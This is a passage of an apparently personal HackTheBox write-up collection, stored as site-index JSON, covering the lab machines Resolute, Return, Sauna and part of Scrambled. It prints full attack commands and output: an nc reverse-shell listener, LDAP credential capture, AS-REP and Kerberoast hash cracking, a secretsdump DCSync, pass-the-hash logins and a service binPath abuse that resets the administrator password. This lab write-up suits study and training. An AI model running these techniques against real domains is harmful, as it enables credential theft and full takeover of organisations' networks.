WIN32_OWN_PROCESS\n        STATE              : 3  STOP_PENDING\n                                (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)\n        WIN32_EXIT_CODE    : 0  (0x0)\n        SERVICE_EXIT_CODE  : 0  (0x0)\n        CHECKPOINT         : 0x1\n        WAIT_HINT          : 0x7530\n*Evil-WinRM* PS C:\\Users\\ryan\\Documents&gt; sc.exe start dns\n\nSERVICE_NAME: dns\n        TYPE               : 10  WIN32_OWN_PROCESS\n        STATE              : 2  START_PENDING\n                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)\n        WIN32_EXIT_CODE    : 0  (0x0)\n        SERVICE_EXIT_CODE  : 0  (0x0)\n        CHECKPOINT         : 0x0\n        WAIT_HINT          : 0x7d0\n        PID                : 2652\n        FLAGS              :\n</code></pre> <p>And we have a shell</p> <pre><code>$ rlwrap nc -lnvp 9090                                        \nlistening on [any] 9090 ...\nconnect to [10.10.14.11] from (UNKNOWN) [10.10.10.169] 51688\nMicrosoft Windows [Version 10.0.14393]\n(c) 2016 Microsoft Corporation. All rights reserved.\n\nC:\\Windows\\system32&gt;whoami\nwhoami\nnt authority\\system\n</code></pre>","tags":["\ud83d\uddc3\ufe0f Active Directory","\ud83d\udce6 HackTheBox","HackTheBox","Active Directory"]},{"location":"resolute/#post-exploitation","title":"Post Exploitation","text":"<p>Get the flag</p> <pre><code>C:\\Windows\\system32&gt;type C:\\Users\\Administrator\\Desktop\\root.txt\ntype C:\\Users\\Administrator\\Desktop\\root.txt\n49b3587c718bba01ab71f2d2e7142648\n</code></pre>","tags":["\ud83d\uddc3\ufe0f Active Directory","\ud83d\udce6 HackTheBox","HackTheBox","Active Directory"]},{"location":"return/","title":"Return","text":"","tags":["\ud83d\uddc3\ufe0f Active Directory","\ud83d\udce6 HackTheBox","HackTheBox","Active Directory"]},{"location":"return/#enumeration","title":"Enumeration","text":"<pre><code>$ nmap -sC -sV -Pn -T4 --min-rate 5000 -p- 10.10.11.108\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-25 20:06 CET\nStats: 0:00:03 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan\nSYN Stealth Scan Timing: About 25.21% done; ETC: 20:06 (0:00:09 remaining)\nNmap scan report for 10.10.11.108\nHost is up (0.041s latency).\nNot shown: 65510 closed tcp ports (reset)\nPORT      STATE SERVICE       VERSION\n53/tcp    open  domain        Simple DNS Plus\n80/tcp    open  http          Microsoft IIS httpd 10.0\n|_http-title: HTB Printer Admin Panel\n| http-methods: \n|_  Potentially risky methods: TRACE\n|_http-server-header: Microsoft-IIS/10.0\n88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-11-25 19:25:16Z)\n135/tcp   open  msrpc         Microsoft Windows RPC\n139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn\n389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name)\n445/tcp   open  microsoft-ds?\n464/tcp   open  kpasswd5?\n593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n636/tcp   open  tcpwrapped\n3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name)\n3269/tcp  open  tcpwrapped\n5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-server-header: Microsoft-HTTPAPI/2.0\n|_http-title: Not Found\n9389/tcp  open  mc-nmf        .NET Message Framing\n47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-server-header: Microsoft-HTTPAPI/2.0\n|_http-title: Not Found\n49664/tcp open  msrpc         Microsoft Windows RPC\n49665/tcp open  msrpc         Microsoft Windows RPC\n49666/tcp open  msrpc         Microsoft Windows RPC\n49667/tcp open  msrpc         Microsoft Windows RPC\n49671/tcp open  msrpc         Microsoft Windows RPC\n49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n49675/tcp open  msrpc         Microsoft Windows RPC\n49679/tcp open  msrpc         Microsoft Windows RPC\n49682/tcp open  msrpc         Microsoft Windows RPC\n49694/tcp open  msrpc         Microsoft Windows RPC\nService Info: Host: PRINTER; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n| smb2-time: \n|   date: 2024-11-25T19:26:07\n|_  start_date: N/A\n| smb2-security-mode: \n|   3:1:1: \n|_    Message signing enabled and required\n|_clock-skew: 18m34s\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 77.55 seconds\n</code></pre> <p>We have a web config portal on <code>port 80</code>.</p> <p></p> <p>So if we start a listener on <code>389</code> and send the request:</p> <pre><code>$ nc -lnvp 389\nlistening on [any] 389 ...\nconnect to [10.10.14.11] from (UNKNOWN) [10.10.11.108] 63830\n0*`%return\\svc-printer\ufffd\n                       1edFg43012!!\n</code></pre> <p>We have <code>svc-printer:1edFg43012!!</code>.</p>","tags":["\ud83d\uddc3\ufe0f Active Directory","\ud83d\udce6 HackTheBox","HackTheBox","Active Directory"]},{"location":"return/#initial-access","title":"Initial Access","text":"<p>Enter via <code>evil-winrm</code>.</p> <pre><code>$ evil-winrm -i 10.10.11.108 -u svc-printer -p '1edFg43012!!'\n\nEvil-WinRM shell v3.7\n\nInfo: Establishing connection to remote endpoint\n*Evil-WinRM* PS C:\\Users\\svc-printer\\Documents&gt; ls\n</code></pre> <p>Get the flag:</p> <pre><code>*Evil-WinRM* PS C:\\Users\\svc-printer\\Desktop&gt; type user.txt\nd7dc8d0ca7c34ad11ee6758818d05458\n</code></pre>","tags":["\ud83d\uddc3\ufe0f Active Directory","\ud83d\udce6 HackTheBox","HackTheBox","Active Directory"]},{"location":"return/#privilege-escalation","title":"Privilege Escalation","text":"<p>We have a lot of privileges, so:</p> <pre><code>*Evil-WinRM* PS C:\\Users&gt; whoami /priv\n\nPRIVILEGES INFORMATION\n----------------------\n\nPrivilege Name                Description                         State\n============================= =================================== =======\nSeMachineAccountPrivilege     Add workstations to domain          Enabled\nSeLoadDriverPrivilege         Load and unload device drivers      Enabled\nSeSystemtimePrivilege         Change the system time              Enabled\nSeBackupPrivilege             Back up files and directories       Enabled\nSeRestorePrivilege            Restore files and directories       Enabled\nSeShutdownPrivilege           Shut down the system                Enabled\nSeChangeNotifyPrivilege       Bypass traverse checking            Enabled\nSeRemoteShutdownPrivilege     Force shutdown from a remote system Enabled\nSeIncreaseWorkingSetPrivilege Increase a process working set      Enabled\nSeTimeZonePrivilege           Change the time zone                Enabled\n</code></pre> <p>We can use the Service Operators group and manipulate a service. Use the <code>services</code> command to list them and try one, then set the <code>binpath</code> to change the <code>Administrator</code> password:</p> <pre><code>*Evil-WinRM* PS C:\\&gt; sc.exe config VMTools binPath=\"C:\\Windows\\System32\\cmd.exe /c net user Administrator Buenas123#\"\n[SC] ChangeServiceConfig SUCCESS\n*Evil-WinRM* PS C:\\&gt; sc.exe stop VMTools\n[SC] ControlService FAILED 1062:\n\nThe service has not been started.\n\n*Evil-WinRM* PS C:\\&gt; sc.exe start VMTools\n[SC] StartService FAILED 1053:\n\nThe service did not respond to the start or control request in a timely fashion.\n</code></pre> <pre><code>$ evil-winrm -i 10.10.11.108 -u Administrator -p Buenas123#\n\nEvil-WinRM shell v3.7\n\nInfo: Establishing connection to remote endpoint\n*Evil-WinRM* PS C:\\Users\\Administrator\\Documents&gt;\n</code></pre>","tags":["\ud83d\uddc3\ufe0f Active Directory","\ud83d\udce6 HackTheBox","HackTheBox","Active Directory"]},{"location":"return/#post-exploitation","title":"Post Exploitation","text":"<p>Get the flag:</p> <pre><code>*Evil-WinRM* PS C:\\Users\\Administrator\\Desktop&gt;type root.txt\n48acc7cefd2263b5dad91838bbf0bc8d\n</code></pre>","tags":["\ud83d\uddc3\ufe0f Active Directory","\ud83d\udce6 HackTheBox","HackTheBox","Active Directory"]},{"location":"sauna/","title":"Sauna","text":"","tags":["\ud83d\uddc3\ufe0f Active Directory","\ud83d\udce6 HackTheBox","HackTheBox","Active Directory"]},{"location":"sauna/#enumeration","title":"Enumeration","text":"<pre><code>$ nmap -sC -sV -Pn -T4 --min-rate 1000 -p- 10.10.10.175\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-19 13:28 CET\nNmap scan report for 10.10.10.175\nHost is up (0.044s latency).\nNot shown: 65515 filtered tcp ports (no-response)\nPORT      STATE SERVICE       VERSION\n53/tcp    open  domain        Simple DNS Plus\n80/tcp    open  http          Microsoft IIS httpd 10.0\n| http-methods: \n|_  Potentially risky methods: TRACE\n|_http-server-header: Microsoft-IIS/10.0\n|_http-title: Egotistical Bank :: Home\n88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-11-19 20:25:06Z)\n135/tcp   open  msrpc         Microsoft Windows RPC\n139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn\n389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)\n445/tcp   open  microsoft-ds?\n464/tcp   open  kpasswd5?\n593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n636/tcp   open  tcpwrapped\n3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)\n3269/tcp  open  tcpwrapped\n5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-title: Not Found\n|_http-server-header: Microsoft-HTTPAPI/2.0\n9389/tcp  open  mc-nmf        .NET Message Framing\n49667/tcp open  msrpc         Microsoft Windows RPC\n49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n49674/tcp open  msrpc         Microsoft Windows RPC\n49677/tcp open  msrpc         Microsoft Windows RPC\n49689/tcp open  msrpc         Microsoft Windows RPC\n49696/tcp open  msrpc         Microsoft Windows RPC\nService Info: Host: SAUNA; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n|_clock-skew: 7h55m06s\n| smb2-security-mode: \n|   3:1:1: \n|_    Message signing enabled and required\n| smb2-time: \n|   date: 2024-11-19T20:25:54\n|_  start_date: N/A\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 184.28 seconds\n</code></pre> <p>Add the domain to <code>/etc/hosts</code>.</p> <p>I can't see shares or enter a null session, so let's explore the web.</p> <p>There is an about page with the people of the company. We can make a user list with the names.</p> <p></p> <pre><code>fergus.smith\nfsmith\nhugo.bear\nhbear\nsteven.kerb\ns.kerb\nshaun.coins\nscoins\nbowie.taylor\nbtaylor\nsophie.driver\nsdriver\n</code></pre> <p>Use <code>kerbrute</code> to find a valid user.</p> <pre><code>$ ./kerbrute userenum -d EGOTISTICAL-BANK.LOCAL --dc 10.10.10.175 ../users \n\n    __             __               __     \n   / /_____  _____/ /_  _______  __/ /____ \n  / //_/ _ \\/ ___/ __ \\/ ___/ / / / __/ _ \\\n / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/\n/_/|_|\\___/_/  /_.___/_/   \\__,_/\\__/\\___/                                        \n\nVersion: v1.0.3 (9dad6e1) - 11/19/24 - Ronnie Flathers @ropnop\n\n2024/11/19 16:31:18 &gt;  Using KDC(s):\n2024/11/19 16:31:18 &gt;   10.10.10.175:88\n\n2024/11/19 16:31:18 &gt;  [+] VALID USERNAME:       fsmith@EGOTISTICAL-BANK.LOCAL\n2024/11/19 16:31:18 &gt;  Done! Tested 12 usernames (1 valid) in 0.090 seconds\n</code></pre> <p>And we have <code>fsmith</code>, now the password.</p> <p>We can try an ASREPRoasting with the user and blank password.</p> <pre><code>$ impacket-GetNPUsers -dc-ip 10.10.10.175 egotistical-bank.local/fsmith -request -format hashcat \nImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies \n\nPassword:\n[*] Cannot authenticate fsmith, getting its TGT\n$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:acfacdccbda31c5e94468470135bf51c$eb3b42a42d498068caa61e71f24e9a10baab05ed637f5614982ca716074ab86250b4d243d612b005336fa0beb107460bb9b6aafe7fdc7570763fe2df40892031e965374323b4ffd8280f66adf236b62038c8ba0854c62e7716b70b3ded34ad0e70e2ee9383e43e9446e78af6bed5d2aa2318b3d4812da24999ad598cb6f304682027b6b5d330c50cea07c1c76caab71354cc696824e5be0cac5997291f479e0211de4a8a7059997f6535af2871b4e24c719b38f6b4ee365731d0112b8336409275c15410a1d8164e030578f62dacac1d127cb608f575960d14648c778f230ed626569c829b9ddbe44c1796b405f6932f82975d9219d6d8cc93e552d4966ac3e0\n</code></pre> <p>Using <code>hashcat</code> we get the password <code>'fsmith:Thestrokes23'</code>.</p> <pre><code>$ hashcat -m 18200 hash /usr/share/wordlists/rockyou.txt  \nhashcat (v6.2.6) starting\n\n...\n\n$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:acfacdccbda31c5e94468470135bf51c$eb3b42a42d498068caa61e71f24e9a10baab05ed637f5614982ca716074ab86250b4d243d612b005336fa0beb107460bb9b6aafe7fdc7570763fe2df40892031e965374323b4ffd8280f66adf236b62038c8ba0854c62e7716b70b3ded34ad0e70e2ee9383e43e9446e78af6bed5d2aa2318b3d4812da24999ad598cb6f304682027b6b5d330c50cea07c1c76caab71354cc696824e5be0cac5997291f479e0211de4a8a7059997f6535af2871b4e24c719b38f6b4ee365731d0112b8336409275c15410a1d8164e030578f62dacac1d127cb608f575960d14648c778f230ed626569c829b9ddbe44c1796b405f6932f82975d9219d6d8cc93e552d4966ac3e0:Thestrokes23\n</code></pre>","tags":["\ud83d\uddc3\ufe0f Active Directory","\ud83d\udce6 HackTheBox","HackTheBox","Active Directory"]},{"location":"sauna/#initial-access","title":"Initial Access","text":"<pre><code>$ evil-winrm -u fsmith -p Thestrokes23 -i 10.10.10.175\n\nEvil-WinRM shell v3.7\n\nInfo: Establishing connection to remote endpoint\n*Evil-WinRM* PS C:\\Users\\FSmith\\Documents&gt; cd ..\n</code></pre> <p>Get the flag</p> <pre><code>*Evil-WinRM* PS C:\\Users\\FSmith\\Desktop&gt; type user.txt\n95c08876d46d462d064c1471e6a83c36\n</code></pre>","tags":["\ud83d\uddc3\ufe0f Active Directory","\ud83d\udce6 HackTheBox","HackTheBox","Active Directory"]},{"location":"sauna/#privilege-escalation","title":"Privilege Escalation","text":"<p>We can do a Kerberoasting attack.</p> <pre><code>$ faketime '2024-11-20 02:56:20' impacket-GetUserSPNs -dc-ip 10.10.10.175 egotistical-bank.local/fsmith -request\nImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies \n\nPassword:\nServicePrincipalName                      Name    MemberOf  PasswordLastSet             LastLogon  Delegation \n----------------------------------------  ------  --------  --------------------------  ---------  ----------\nSAUNA/HSmith.EGOTISTICALBANK.LOCAL:60111  HSmith            2020-01-23 06:54:34.140321  &lt;never&gt;               \n\n\n\n[-] CCache file is not found. Skipping...\n$krb5tgs$23$*HSmith$EGOTISTICAL-BANK.LOCAL$egotistical-bank.local/HSmith*$cbd0dcbac2c6e3f3899f956a5b6f8b4c$5a8e6d538b92edf6f6b887a6986ad2642974f7382f5b837c4b7742f12172494b2fda446f09f52c9773b7b1098315449f56304cfe105a7608d741099f4331dd429501fd65d6619be631d616cdad252226a05a571cdbe92640a42c3b8d71fbf0878efed69d9e73e1b6acf37f4adcb1aa64fa8e2f03f86f1a120a428ea2806c7af7e33a8d31d6418fe52a93c5bc890d184b1e21b68aa4f86bcf1669c2435334facde53bef3d95f43289938b2475e7b803f003330f6b429e2b302e1d67e01086c2789f3ec08c72456681501a668269fea97c7a0d570ccf5de263739a7444ef3da2a266a3c5a32ec5c014e2a99807ae532a49a7e6cde16a07a069f30f3452aa4b320d85e82e9cd114a24bc9294036702919733cf5faeebe3a35fdac4a5fa4a26216e0aeb915fc9611b17e10e09849da3d6987ace1f85b940da6e7b16c5fee8b21446e6eebc70d2df7a893deb3c93dc8fb8d7088231d9e46cc8b15edce979aa57fa30d2cbbd50a917acb7c69644359ab1555d7336d892342a051250698fdfd3d752f243f1c4081919683f91d0a879fe57416b3cb7e01aef903ea6e91f589f26c2bfd74d6316e630dcd110378e65d3b6f8418a1c4236bc2ebbf14f11364f92e53e04e95c36a4fa7a96d4b77dbe5829e6faa4290b4a2dde7e0b4b70f98357956948650025edb92affce37f92979171a88c79de9934f76244463b029358276b5ff58f06a3bb0ce826bc55ccbd09a093d72cff502312a6f10b4a44316e6947b029d5a8ef62edbe5087f99bfd45ec98357685169957a119b48238321996fcb6d56fa0b227e0221fe9812d5c9f3967a34259ff840fbd3587e7f52de9bd7220df2bad1bf629a5127958f043323bd962976636a8f14337328296605e9bf65ed68becad7a3eb48ead1a113677f37794d1c71a0fdf181df9afc9422209cf540c3055f5262993af1cae4cd0170c2de637bbab4f1c876f8ab9cd562148ab4ebb1692be3dbcb39aaa8f902655df9eb559ac32230c06829ceb3d8544895f2fc5f5974dec9e7477df3af1568ab82416eab8f6d015b591a4cfff04423739aea8a4381bdd79f8b0ab220fc49e6bbb9d88e1c6f99480db85d8384efc253f0196bf7fe0cfe27ef3f02770afe204d322c6398c55c0f9038392beb6ac333e7b8642b9cc4653de6fed3239e157382bad41b8a13af103aa91770d13d13aef0f5286e9575137466ec478042202803a3edb01d3a110d7ef5b1a0a5825f6c1289a4579e1282c640835ebccdbebdfbef7d458523ba9af5616df9459549db001e6e67fd8ecadb4b30b5b47100bf64682fd8ab6da41dee98557e21d50d158be69ee20cfd7a54d4467ce30198bf0e504211640774f9ea2493709b025184586efa3f09b04e8bb67713dcb5a242ec656544c05dd7ff73f83\n</code></pre> <p>There is a user that can be Kerberoasted named <code>HSmith</code>, let's use <code>hashcat</code>.</p> <pre><code>$ hashcat -m 13100 hash /usr/share/wordlists/rockyou.txt   \nhashcat (v6.2.6) starting\n\n\n$krb5tgs$23$*HSmith$EGOTISTICAL-BANK.LOCAL$egotistical-bank.local/HSmith*$cbd0dcbac2c6e3f3899f956a5b6f8b4c$5a8e6d538b92edf6f6b887a6986ad2642974f7382f5b837c4b7742f12172494b2fda446f09f52c9773b7b1098315449f56304cfe105a7608d741099f4331dd429501fd65d6619be631d616cdad252226a05a571cdbe92640a42c3b8d71fbf0878efed69d9e73e1b6acf37f4adcb1aa64fa8e2f03f86f1a120a428ea2806c7af7e33a8d31d6418fe52a93c5bc890d184b1e21b68aa4f86bcf1669c2435334facde53bef3d95f43289938b2475e7b803f003330f6b429e2b302e1d67e01086c2789f3ec08c72456681501a668269fea97c7a0d570ccf5de263739a7444ef3da2a266a3c5a32ec5c014e2a99807ae532a49a7e6cde16a07a069f30f3452aa4b320d85e82e9cd114a24bc9294036702919733cf5faeebe3a35fdac4a5fa4a26216e0aeb915fc9611b17e10e09849da3d6987ace1f85b940da6e7b16c5fee8b21446e6eebc70d2df7a893deb3c93dc8fb8d7088231d9e46cc8b15edce979aa57fa30d2cbbd50a917acb7c69644359ab1555d7336d892342a051250698fdfd3d752f243f1c4081919683f91d0a879fe57416b3cb7e01aef903ea6e91f589f26c2bfd74d6316e630dcd110378e65d3b6f8418a1c4236bc2ebbf14f11364f92e53e04e95c36a4fa7a96d4b77dbe5829e6faa4290b4a2dde7e0b4b70f98357956948650025edb92affce37f92979171a88c79de9934f76244463b029358276b5ff58f06a3bb0ce826bc55ccbd09a093d72cff502312a6f10b4a44316e6947b029d5a8ef62edbe5087f99bfd45ec98357685169957a119b48238321996fcb6d56fa0b227e0221fe9812d5c9f3967a34259ff840fbd3587e7f52de9bd7220df2bad1bf629a5127958f043323bd962976636a8f14337328296605e9bf65ed68becad7a3eb48ead1a113677f37794d1c71a0fdf181df9afc9422209cf540c3055f5262993af1cae4cd0170c2de637bbab4f1c876f8ab9cd562148ab4ebb1692be3dbcb39aaa8f902655df9eb559ac32230c06829ceb3d8544895f2fc5f5974dec9e7477df3af1568ab82416eab8f6d015b591a4cfff04423739aea8a4381bdd79f8b0ab220fc49e6bbb9d88e1c6f99480db85d8384efc253f0196bf7fe0cfe27ef3f02770afe204d322c6398c55c0f9038392beb6ac333e7b8642b9cc4653de6fed3239e157382bad41b8a13af103aa91770d13d13aef0f5286e9575137466ec478042202803a3edb01d3a110d7ef5b1a0a5825f6c1289a4579e1282c640835ebccdbebdfbef7d458523ba9af5616df9459549db001e6e67fd8ecadb4b30b5b47100bf64682fd8ab6da41dee98557e21d50d158be69ee20cfd7a54d4467ce30198bf0e504211640774f9ea2493709b025184586efa3f09b04e8bb67713dcb5a242ec656544c05dd7ff73f83:Thestrokes23\n</code></pre> <p>And we have <code>hsmith:Thestrokes23</code>, same password as fsmith.</p> <p>This user is a rabbit hole. Let's continue with <code>fsmith</code>.</p> <p>Upload <code>sharphound</code> and run <code>sh.exe -c All</code> and upload to <code>bloodhound</code>.</p> <p></p> <p>Running <code>winpeas</code> we find:</p> <pre><code>\u00c9\u00cd\u00cd\u00cd\u00cd\u00cd\u00cd\u00cd\u00cd\u00cd\u00cd\u00b9 Looking for AutoLogon credentials\n    Some AutoLogon credentials were found\n    DefaultDomainName             :  EGOTISTICALBANK\n    DefaultUserName               :  EGOTISTICALBANK\\svc_loanmanager\n    DefaultPassword               :  Moneymakestheworldgoround!\n</code></pre> <p><code>Bloodhound</code> tells us that this user can DCSync the domain, so get hashes via <code>secretsdump</code>.</p> <p></p> <pre><code>$ impacket-secretsdump 'egotistical-bank.local'/'svc_loanmgr':'Moneymakestheworldgoround!'@10.10.10.175\nImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies \n\n[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied \n[*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)\n[*] Using the DRSUAPI method to get NTDS.DIT secrets\nAdministrator:500:aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e:::\nGuest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nkrbtgt:502:aad3b435b51404eeaad3b435b51404ee:4a8899428cad97676ff802229e466e2c:::\nEGOTISTICAL-BANK.LOCAL\\HSmith:1103:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::\nEGOTISTICAL-BANK.LOCAL\\FSmith:1105:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::\n...\n[*] Cleaning up... \n</code></pre> <p>We have the <code>administrator</code> hash, we can use <code>evil-winrm</code> with PTH.</p> <pre><code>$ evil-winrm -u Administrator -H 823452073d75b9d1cf70ebdf86c7f98e -i 10.10.10.175\n\nEvil-WinRM shell v3.7\n\nInfo: Establishing connection to remote endpoint\n*Evil-WinRM* PS C:\\Users\\Administrator\\Documents&gt;\n</code></pre>","tags":["\ud83d\uddc3\ufe0f Active Directory","\ud83d\udce6 HackTheBox","HackTheBox","Active Directory"]},{"location":"sauna/#post-exploitation","title":"Post Exploitation","text":"<pre><code>*Evil-WinRM* PS C:\\Users\\Administrator\\Documents&gt; type ..\\Desktop\\root.txt\nbdd3353dd85a13d8be0c9c5d023ac706\n</code></pre>","tags":["\ud83d\uddc3\ufe0f Active Directory","\ud83d\udce6 HackTheBox","HackTheBox","Active Directory"]},{"location":"scrambled/","title":"Scrambled","text":"","tags":["\ud83d\uddc3\ufe0f Active Directory","\ud83d\udce6 HackTheBox","HackTheBox","Active Directory"]},{"location":"scrambled/#enumeration","title":"Enumeration","text":"<pre><code>$ nmap -sC -sV -Pn -T4 --min-rate 5000 -p- 10.10.11.168\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-27 23:20 CET\nNmap scan report for 10.10.11.168\nHost is up (0.040s latency).\nNot shown: 65514 filtered tcp ports (no-response)\nBug in ms-sql-ntlm-info: no string output.\nPORT      STATE SERVICE       VERSION\n53/tcp    open  domain        Simple DNS Plus\n80/tcp    open  http          Microsoft IIS httpd 10.0\n|_http-title: Scramble Corp Intranet\n| http-methods: \n|_  Potentially risky methods: TRACE\n|_http-server-header: Microsoft-IIS/10.0\n88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-11-27 22:20:40Z)\n135/tcp   open  msrpc         Microsoft Windows RPC\n139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn\n389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)\n| ssl-cert: Subject: \n| Subject Alternative Name: DNS:DC1.scrm.local\n| Not valid before: 2024-09-04T11:14:45\n|_Not valid after:  2121-06-08T22:39:53\n|_ssl-date: 2024-11-27T22:23:46+00:00; 0s from scanner time.\n445/tcp   open  microsoft-ds?\n464/tcp   open  kpasswd5?\n593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)\n|_ssl-date: 2024-11-27T22:23:46+00:00; 0s from scanner time.\n| ssl-cert: Subject: \n| Subject Alternative Name: DNS:DC1.scrm.local\n| Not valid before: 2024-09-04T11:14:45\n|_Not valid after:  2121-06-08T22:39:53\n1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM\n|_ssl-date: 2024-11-27T22:23:46+00:00; 0s from scanner time.\n| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback\n| Not valid before: 2024-11-27T22:18:30\n|_Not valid after:  2054-11-27T22:18:30\n| ms-sql-info: \n|   10.10.11.168:1433: \n|     Version: \n|       name: Microsoft SQL Server 2019 RTM\n|       number: 15.00.2000.00\n|       Product: Microsoft SQL Server 2019\n|       Service pack level: RTM\n|       Post-SP patches applied: false\n|_    TCP port: 1433\n3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)\n| ssl-cert: Subject: \n| Subject Alternative Name: DNS:DC1.scrm.local\n| Not valid before: 2024-09-04T11:14:45\n|_Not valid after:  2121-06-08T22:39:53\n|_ssl-date: 2024-11-27T22:23:46+00:00; 0s from scanner time.\n3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)\n| ssl-cert: Subject: \n| Subject Alternative Name: DNS:DC1.scrm.local\n| Not valid before: 2024-09-04T11:14:45\n|_Not valid after:  2121-06-08T22:39:53\n|_ssl-date: 2024-11-27T22:23:46+00:00; 0s from scanner time.\n4411/tcp  open  found?\n| fingerprint-strings: \n|   DNSStatusRequestTCP, DNSVersionBindReqTCP, GenericLines, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, NCP, NULL, NotesRPC, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns: \n|     SCRAMBLECORP_ORDERS_V1.0.3;\n|   FourOhFourRequest, GetRequest, HTTPOptions, Help, LPDString, RTSPRequest, SIPOptions: \n|     SCRAMBLECORP_ORDERS_V1.0.3;\n|_    ERROR_UNKNOWN_COMMAND;\n5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-server-header: Microsoft-HTTPAPI/2.0\n|_http-title: Not Found\n9389/tcp  open  mc-nmf        .NET Message Framing\n49666/tcp open  msrpc         Microsoft Windows RPC\n49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n49674/tcp open  msrpc         Microsoft Windows RPC\n49700/tcp open  msrpc         Microsoft Windows RPC\n54199/tcp open  msrpc         Microsoft Windows RPC\n\nHost script results:\n| smb2-time: \n|   date: 2024-11-27T22:23:09\n|_  start_date: N/A\n| smb2-security-mode: \n|   3:1:1: \n|_    Message signing enabled and required\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 220.34 seconds\n</code></pre> <p>The web doesn't have any working forms, but there is a tutorial for submitting errors to support that leaks a username.</p> <p></p> <p>It explains that all usernames submitted will have their password reset to the same as the username.</p> <p>With this, user <code>ksimpson:ksimpson</code> can enumerate shares using Kerberos and <code>impacket-smbclient</code>.</p> <pre><code>$ impacket-smbclient scrm.local/ksimpson:ksimpson@dc1.scrm.local -k\nImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies \n\n[-] CCache file is not found. Skipping...\nType help for list of commands\n# shares\nADMIN$\nC$\nHR\nIPC$\nIT\nNETLOGON\nPublic\nSales\nSYSVOL\n</code></pre> <p>The only share we can access is <code>Public</code>, and there is a PDF file inside:</p> <p></p>","tags":["\ud83d\uddc3\ufe0f Active Directory","\ud83d\udce6 HackTheBox","HackTheBox","Active Directory"]},{"location":"scrambled/#initial-access","title":"Initial Access","text":"<p>With valid credentials, the most common thing to test is checking for kerberoastable users using Kerberos</p> <pre><code>$ impacket-GetUserSPNs -dc-ip 10.10.11.168 scrm.local/ksimpson -request -k -dc-host dc1.scrm.local -request \nImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies \n\nPassword:\n[-] CCache file is not found. Skipping...\n[-] CCache file is not found. Skipping...\nServicePrincipalName          Name    MemberOf  PasswordLastSet             LastLogon                   Delegation \n----------------------------  ------  --------  --------------------------  --------------------------  ----------\nMSSQLSvc/dc1.scrm.local:1433  sqlsvc            2021-11-03 17:32:02.351452  2024-11-27 23:18:27.549358             \nMSSQLSvc/dc1.scrm.local       sqlsvc            2021-11-03 17:32:02.351452  2024-11-27 23:18:27.549358             \n\n\n[-] CCache file is not found. 